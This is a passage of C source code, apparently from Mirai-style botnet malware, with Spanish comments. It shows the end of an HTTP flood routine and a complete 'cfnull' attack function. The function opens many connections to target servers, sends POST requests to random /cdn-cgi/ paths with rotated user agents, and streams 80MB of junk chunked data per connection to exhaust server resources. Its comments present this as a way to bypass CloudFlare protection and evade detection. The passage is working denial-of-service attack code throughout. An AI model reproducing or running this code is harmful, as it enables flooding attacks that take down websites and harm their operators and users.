                                        conn->state = HTTP_CONN_QUEUE_RESTART;
                                        break;
                                    }
                                }
                            }

                            /* Procesar cuando se completó content-length
                             * - Verifica si hay más chunks
                             * - Procesa formato chunked especial
                             */
                            if (conn->content_length == 0)
                            {
                                /* Manejar transferencia chunked
                                 * - Cada chunk tiene formato: tamaño\r\ndata\r\n
                                 * - Tamaño en hexadecimal
                                 * - Puede incluir extensiones después de ;
                                 */
                                if (conn->chunked == 1)
                                {
                                    /* Buscar delimitador de línea para tamaño
                                     * - El tamaño termina en \r\n
                                     * - Puede tener extensiones después de ;
                                     */
                                    if (util_memsearch(conn->rdbuf, conn->rdbuf_pos, "\r\n", 2) != -1)
                                    {
                                        /* Aislar tamaño del chunk
                                         * - Terminar string en \r\n
                                         * - Remover extensiones después de ;
                                         */
                                        int new_line_pos = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "\r\n", 2);
                                        conn->rdbuf[new_line_pos - 2] = 0;
                                        if (util_memsearch(conn->rdbuf, new_line_pos, ";", 1) != -1)
                                            conn->rdbuf[util_memsearch(conn->rdbuf, new_line_pos, ";", 1)] = 0;

                                        /* Convertir tamaño hex a decimal
                                         * - Interpreta el string como hex (base 16)
                                         * - Un chunk de tamaño 0 indica fin
                                         */
                                        int chunklen = util_atoi(conn->rdbuf, 16);

                                        /* Verificar si es el último chunk
                                         * - Chunk de tamaño 0 marca el final
                                         * - Reiniciar conexión al terminar
                                         */
                                        if (chunklen == 0)
                                        {
                                            conn->state = HTTP_CONN_RESTART;
                                            break;
                                        }

                                        /* Configurar para siguiente chunk
                                         * - Añadir 2 bytes para \r\n final
                                         * - Actualizar bytes procesados
                                         */
                                        conn->content_length = chunklen + 2;
                                        consumed = new_line_pos;
                                    }
                                } else {
                                    /* Modo no-chunked: procesar datos restantes
                                     * - Calcular bytes pendientes
                                     * - Reiniciar si no hay más datos
                                     */
                                    conn->content_length = conn->rdbuf_pos - consumed;
                                    if (conn->content_length == 0)
                                    {
                                        conn->state = HTTP_CONN_RESTART;
                                        break;
                                    }
                                }
                            }

                            /* Verificar si hay datos para procesar
                            * - Si no hay datos, salir del bucle
                            * - Si hay datos, actualizar buffer
                            */
                            if (consumed == 0)
                                break;
                            else
                            {
                                /* Actualizar estado del buffer
                                 * - Remover datos procesados
                                 * - Compactar buffer restante
                                 * - Mantener terminación null
                                 */
                                conn->rdbuf_pos -= consumed;
                                memmove(conn->rdbuf, conn->rdbuf + consumed, conn->rdbuf_pos);
                                conn->rdbuf[conn->rdbuf_pos] = 0;

                                /* Si buffer vacío, terminar procesamiento */
                                if (conn->rdbuf_pos == 0)
                                    break;
                            }
                        }
                    }
                } else if (conn->state == HTTP_CONN_QUEUE_RESTART) {
                    /* Estado de limpieza del buffer antes de reiniciar
                     * - Vacía cualquier dato restante en el socket
                     * - Maneja cierres de conexión limpios
                     * - Reinicia la conexión si es necesario
                     */
                    while(TRUE)
                    {
                        /* Limpiar buffer de recepción */
                        errno = 0;
                        ret = recv(conn->fd, generic_memes, 10240, MSG_NOSIGNAL);
                        
                        /* Manejar cierre graceful de conexión */
                        if (ret == 0)
                        {
#ifdef DEBUG
                            printf("[http flood] HTTP_CONN_QUEUE_RESTART FD%d connection gracefully closed\n", conn->fd);
#endif
                            errno = ECONNRESET;
                            ret = -1; // Propagar para cerrar la conexión
                        }
                        
                        /* Manejar errores de red */
                        if (ret == -1)
                        {
                            /* Solo reiniciar si es error real */
                            if (errno != EAGAIN && errno != EWOULDBLOCK)
                            {
#ifdef DEBUG
                                printf("[http flood] HTTP_CONN_QUEUE_RESTART FD%d lost connection\n", conn->fd);
#endif
                                close(conn->fd);
                                conn->fd = -1;
                                conn->state = HTTP_CONN_INIT;
                            }
                            break;
                        }    
                    }
                    
                    /* Reiniciar conexión si no se cerró por error
                     * - Mantiene el ciclo de reconexión automática
                     */
                    if (conn->state != HTTP_CONN_INIT)
                        conn->state = HTTP_CONN_RESTART;
                }
            }
        }

        // handle any sockets that didnt return from select here
        // also handle timeout on HTTP_CONN_QUEUE_RESTART just in case there was no other data to be read (^: (usually this will never happen)
#ifdef DEBUG
        if (sockets == 1)
        {
            printf("debug mode sleep\n");
            sleep(1);
        }
#endif
    }
}

/**
 * Función de Ataque CloudFlare Null
 * 
 * Implementa un ataque especializado contra servidores protegidos por CloudFlare
 * usando una técnica de envío de datos chunk-encoded inválidos para evadir
 * la protección.
 *
 * Características:
 * - Bypass de CloudFlare
 * - Envío de datos chunked malformados
 * - Consumo de recursos del servidor
 * - Manejo de conexiones persistentes
 *
 * @param targs_len  Número de objetivos
 * @param targs      Array de objetivos
 * @param opts_len   Número de opciones 
 * @param opts       Array de opciones de ataque
 */
void attack_app_cfnull(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    /* Variables de control */
    int i, ii, rfd, ret = 0;                   /* Contadores y estados */
    struct attack_cfnull_state *http_table = NULL; /* Tabla de conexiones */
    
    /* Obtener opciones del ataque */
    char *domain = attack_get_opt_str(opts_len, opts, ATK_OPT_DOMAIN, NULL); /* Dominio objetivo */
    int sockets = attack_get_opt_int(opts_len, opts, ATK_OPT_CONNS, 1);     /* Número de conexiones */

    /* Buffer para datos temporales */
    char generic_memes[10241] = {0};  /* +1 byte para null terminator */

    /* Validación de parámetros obligatorios */
    if (domain == NULL)
        return;  /* Dominio es requerido */

    /* Validación de longitud del dominio */
    if (util_strlen(domain) > HTTP_DOMAIN_MAX - 1)
        return;  /* Dominio demasiado largo */

    /* Limitar número de conexiones al máximo permitido */
    if (sockets > HTTP_CONNECTION_MAX)
        sockets = HTTP_CONNECTION_MAX;  /* No exceder límite de conexiones */

    http_table = calloc(sockets, sizeof(struct attack_cfnull_state));

    /* Inicializar cada conexión en la tabla de estados */
    for (i = 0; i < sockets; i++)
    {
        /* Inicializar estado básico */
        http_table[i].state = HTTP_CONN_INIT;   /* Estado inicial */
        http_table[i].fd = -1;                  /* Socket no creado */
        http_table[i].dst_addr = targs[i % targs_len].addr;  /* IP destino */

        util_strcpy(http_table[i].domain, domain);

        if (targs[i % targs_len].netmask < 32)
            http_table[i].dst_addr = htonl(ntohl(targs[i % targs_len].addr) + (((uint32_t)rand_next()) >> targs[i % targs_len].netmask));

        switch(rand_next() % 5)
        {
            case 0:
                table_unlock_val(TABLE_HTTP_ONE);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_ONE, NULL));
                table_lock_val(TABLE_HTTP_ONE);
                break;
            case 1:
                table_unlock_val(TABLE_HTTP_TWO);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_TWO, NULL));
                table_lock_val(TABLE_HTTP_TWO);
                break;
            case 2:
                table_unlock_val(TABLE_HTTP_THREE);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_THREE, NULL));
                table_lock_val(TABLE_HTTP_THREE);
                break;
            case 3:
                table_unlock_val(TABLE_HTTP_FOUR);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_FOUR, NULL));
                table_lock_val(TABLE_HTTP_FOUR);
                break;
            case 4:
                table_unlock_val(TABLE_HTTP_FIVE);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_FIVE, NULL));
                table_lock_val(TABLE_HTTP_FIVE);
                break;
        }
    }

    while(TRUE)
    {
        fd_set fdset_rd, fdset_wr;
        int mfd = 0, nfds;
        struct timeval tim;
        struct attack_cfnull_state *conn;
        uint32_t fake_time = time(NULL);

        FD_ZERO(&fdset_rd);
        FD_ZERO(&fdset_wr);

        for (i = 0; i < sockets; i++)
        {
            conn = &(http_table[i]);

            if (conn->state == HTTP_CONN_RESTART)
            {
                conn->state = HTTP_CONN_INIT;
            }

            if (conn->state == HTTP_CONN_INIT)
            {
                struct sockaddr_in addr = {0};

                if (conn->fd != -1)
                    close(conn->fd);
                if ((conn->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
                    continue;

                fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));

                ii = 65535;
                setsockopt(conn->fd, 0, SO_RCVBUF, &ii ,sizeof(int));

                addr.sin_family = AF_INET;
                addr.sin_addr.s_addr = conn->dst_addr;
                addr.sin_port = htons(80);

                conn->last_recv = fake_time;
                conn->state = HTTP_CONN_CONNECTING;
                connect(conn->fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
#ifdef DEBUG
                printf("[http flood] fd%d started connect\n", conn->fd);
#endif

                FD_SET(conn->fd, &fdset_wr);
                if (conn->fd > mfd)
                    mfd = conn->fd + 1;
            }
            else if (conn->state == HTTP_CONN_CONNECTING)
            {
                if (fake_time - conn->last_recv > 30)
                {
                    conn->state = HTTP_CONN_INIT;
                    close(conn->fd);
                    conn->fd = -1;
                    continue;
                }

                FD_SET(conn->fd, &fdset_wr);
                if (conn->fd > mfd)
                    mfd = conn->fd + 1;
            }
            else if (conn->state == HTTP_CONN_SEND_HEADERS)
            {
                /* Estado de envío de cabeceras HTTP
                 * Construye y envía una solicitud POST malformada para bypass CloudFlare:
                 * - Ruta aleatoria en /cdn-cgi/
                 * - Headers HTTP estándar pero con encoding chunked malicioso
                 * - User-Agent aleatorio de la tabla cifrada
                 */
#ifdef DEBUG
                //printf("[http flood] Sending http request\n");
#endif

                /* Buffer para construir la solicitud HTTP */
                char buf[10240];
                util_zero(buf, 10240);

                /* Construir la solicitud POST con ruta aleatoria 
                 * - Evita firmas de WAF usando rutas aleatorias
                 * - Simula acceso a recursos de CloudFlare
                 */
                util_strcpy(buf + util_strlen(buf), "POST /cdn-cgi/");
                rand_alphastr(buf + util_strlen(buf), 16);
                util_strcpy(buf + util_strlen(buf), " HTTP/1.1\r\nUser-Agent: ");
                util_strcpy(buf + util_strlen(buf), conn->user_agent);
                util_strcpy(buf + util_strlen(buf), "\r\nHost: ");
                util_strcpy(buf + util_strlen(buf), conn->domain);
                util_strcpy(buf + util_strlen(buf), "\r\n");

                /* Agregar headers estándar desde tabla cifrada
                 * - Keep-Alive para mantener conexión
                 * - Accept y Accept-Language para simular browser
                 * - Content-Type para datos POST
                 */
                table_unlock_val(TABLE_ATK_KEEP_ALIVE);
                util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_KEEP_ALIVE, NULL));
                table_lock_val(TABLE_ATK_KEEP_ALIVE);
                util_strcpy(buf + util_strlen(buf), "\r\n");

                table_unlock_val(TABLE_ATK_ACCEPT);
                util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_ACCEPT, NULL));
                table_lock_val(TABLE_ATK_ACCEPT);
                util_strcpy(buf + util_strlen(buf), "\r\n");

                table_unlock_val(TABLE_ATK_ACCEPT_LNG);
                util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_ACCEPT_LNG, NULL));
                table_lock_val(TABLE_ATK_ACCEPT_LNG);
                util_strcpy(buf + util_strlen(buf), "\r\n");

                table_unlock_val(TABLE_ATK_CONTENT_TYPE);
                util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_CONTENT_TYPE, NULL));
                table_lock_val(TABLE_ATK_CONTENT_TYPE);
                util_strcpy(buf + util_strlen(buf), "\r\n");

                /* Configurar Transfer-Encoding chunked
                 * - Permite envío de datos fragmentados
                 * - Se usará para enviar chunks malformados
                 */
                table_unlock_val(TABLE_ATK_TRANSFER_ENCODING_HDR);
                util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_TRANSFER_ENCODING_HDR, NULL));
                table_lock_val(TABLE_ATK_TRANSFER_ENCODING_HDR);
                util_strcpy(buf + util_strlen(buf), " ");
                table_unlock_val(TABLE_ATK_CHUNKED);
                util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_CHUNKED, NULL));
                table_lock_val(TABLE_ATK_CHUNKED);
                util_strcpy(buf + util_strlen(buf), "\r\n");

                /* Línea en blanco que separa headers del body */
                util_strcpy(buf + util_strlen(buf), "\r\n");

                /* Configurar cantidad de datos a enviar
                 * - 80MB de datos aleatorios en chunks
                 * - Consume recursos del servidor procesando chunks
                 */
                conn->to_send = (80 * 1024 * 1024);

#ifdef DEBUG
                if (sockets == 1)
                {
                    printf("sending buf: \"%s\"\n", buf);
                }
#endif

                /* Enviar headers HTTP iniciales */
                send(conn->fd, buf, util_strlen(buf), MSG_NOSIGNAL);
                conn->last_send = fake_time;

                /* Transición a estado de envío de datos aleatorios
                 * - Cambia a HTTP_CONN_SEND_JUNK para enviar chunks
                 * - Monitorea lectura y escritura para control de flujo
                 */
                conn->state = HTTP_CONN_SEND_JUNK;
                FD_SET(conn->fd, &fdset_wr);  /* Monitorear para escritura */
                FD_SET(conn->fd, &fdset_rd);  /* Monitorear para lectura */
                if (conn->fd > mfd)
                    mfd = conn->fd + 1;
            }
            else if (conn->state == HTTP_CONN_SEND_JUNK)
            {
                /* Estado de envío de datos chunked malformados
                 * Este estado implementa la lógica principal del ataque:
                 * 1. Genera chunks de datos aleatorios
                 * 2. Envía tamaños de chunk malformados
                 * 3. Mantiene la conexión ocupada procesando chunks
                 */
                int sent = 0;
                char rndbuf[1025] = {0};  /* +1 para null terminator */
                util_zero(rndbuf, 1025);
                rand_alphastr(rndbuf, 1024);  /* Llenar con datos aleatorios */

                /* Si terminamos de enviar datos, cerrar el chunked encoding */
                if (conn->to_send <= 0)
                {
                    send(conn->fd, "0\r\n", 3, MSG_NOSIGNAL); /* Chunk final */
                } else {
                    /* Manejar último chunk parcial */
                    if (conn->to_send < 1024)
                        rndbuf[conn->to_send] = 0;  /* Truncar al tamaño exacto */

                    /* Enviar header de chunk cada 1KB
                     * - Formato chunked: tamaño en hex + CRLF + datos + CRLF
                     * - Mantiene chunks pequeños para evadir buffering
                     */
                    if ((conn->to_send >= 1024 && (conn->to_send % 1024) == 0))
                    {
                        /* Enviar tamaño del chunk en hexadecimal */
                        char szbuf[4] = {0};
                        util_zero(szbuf, 4);
                        util_itoa(1024, 16, szbuf);
                        send(conn->fd, szbuf, util_strlen(szbuf), MSG_NOSIGNAL);
                        send(conn->fd, "\r\n", 2, MSG_NOSIGNAL); /* CRLF requerido */
                    }

                    /* Enviar chunk de datos aleatorios
                     * - MSG_NOSIGNAL evita SIGPIPE si conexión se cierra
                     * - Maneja errores de envío reiniciando conexión
                     */
                    if ((sent = send(conn->fd, rndbuf, util_strlen(rndbuf), MSG_NOSIGNAL)) == -1)
                    {
                        conn->state = HTTP_CONN_RESTART;
                        continue;
                    }

                    /* Control de flujo si buffer TCP está lleno
                     * - Cambia a estado de espera si no puede enviar todo
                     * - Evita saturar buffers locales
                     */
                    if (sent != util_strlen(rndbuf))
                    {
                        conn->state = HTTP_CONN_SNDBUF_WAIT;
                    }

                    /* Actualizar contadores y monitoreo
                     * - Reduce bytes pendientes
                     * - Actualiza timestamp de último envío
                     * - Configura monitoreo de escritura/lectura
                     */
                    conn->to_send -= sent;
                    FD_SET(conn->fd, &fdset_wr);  /* Monitorear para más escritura */
                }

                conn->last_send = fake_time;
                FD_SET(conn->fd, &fdset_rd);  /* Monitorear respuestas */
                if (conn->fd > mfd)
                    mfd = conn->fd + 1;
            }
            else if (conn->state == HTTP_CONN_SNDBUF_WAIT)
            {
                /* Estado de espera del buffer de envío
                 * Este estado maneja la situación cuando el buffer TCP está lleno:
                 * - Espera a que el buffer se libere antes de enviar más datos
                 * - Previene pérdida de datos por desbordamiento
                 * - Implementa control de flujo a nivel de aplicación
                 */
                FD_SET(conn->fd, &fdset_wr);  /* Monitorear cuando se puede escribir */
                if (conn->fd > mfd)
                    mfd = conn->fd + 1;
            }
            else
            {
                /* Estado desconocido o inválido
                 * Si llegamos aquí algo salió mal:
                 * - Reiniciar la conexión desde cero
                 * - Limpiar recursos asignados
                 * - Preparar para nuevo intento
                 */
                conn->state = HTTP_CONN_INIT;
                close(conn->fd);
                conn->fd = -1;
            }
        }

        /* Si no hay descriptores activos, siguiente iteración
         * - Evita select() con conjunto vacío
         * - Optimiza ciclo de eventos
         */
        if (mfd == 0)
            continue;

        tim.tv_usec = 0;
        tim.tv_sec = 1;
        nfds = select(mfd, &fdset_rd, &fdset_wr, NULL, &tim);
        fake_time = time(NULL);

        if (nfds < 1)
            continue;

        for (i = 0; i < sockets; i++)
        {
            conn = &(http_table[i]);

            if (conn->fd == -1)
                continue;

            if (FD_ISSET(conn->fd, &fdset_wr))
            {
                /* Estado de conexión en progreso
                 * Verifica si la conexión no bloqueante se completó
                 */
                if (conn->state == HTTP_CONN_CONNECTING)
                {
                    /* Verificar estado final de la conexión
                     * - Usar getsockopt() para obtener error si hubo
                     * - SO_ERROR retorna 0 si conexión exitosa
                     */
                    int err = 0;
                    socklen_t err_len = sizeof (err);

                    ret = getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
                    if (err == 0 && ret == 0)
                    {
#ifdef DEBUG
                        printf("[http flood] FD%d connected.\n", conn->fd);
#endif
                        /* Conexión establecida - iniciar envío de datos */
                        conn->state = HTTP_CONN_SEND;
                    }
                    else
                    {
#ifdef DEBUG
                        printf("[http flood] FD%d error while connecting = %d\n", conn->fd, err);
#endif
                        /* Error de conexión - limpiar y reiniciar */
                        close(conn->fd);
                        conn->fd = -1;
                        conn->state = HTTP_CONN_INIT;
                        continue;
                    }
                }
                else if (conn->state == HTTP_CONN_SNDBUF_WAIT)
                {
					conn->state = HTTP_CONN_SEND_JUNK;
                }
            }

            /* Procesar eventos de lectura en socket 
             * En el ataque cfnull:
             * - Cualquier respuesta del servidor indica detección
             * - Mejor reiniciar la conexión y cambiar patrón
             */
            if (FD_ISSET(conn->fd, &fdset_rd))
            {
                /* Ignorar cualquier respuesta y reiniciar
                 * - No nos interesa el contenido recibido
                 * - Reiniciar conexión para evadir detección
                 */
                conn->state = HTTP_CONN_RESTART;
            }
        }

        /* Manejo de timeouts y casos especiales
         * - Procesar sockets que no retornaron de select()
         * - Manejar timeout en HTTP_CONN_QUEUE_RESTART 
         * - Asegurar que no queden conexiones estancadas
         */
#ifdef DEBUG
        if (sockets == 1)
        {
            printf("debug mode sleep\n");
            sleep(1);  /* Ralentizar en modo debug */
        }
#endif
    }
}

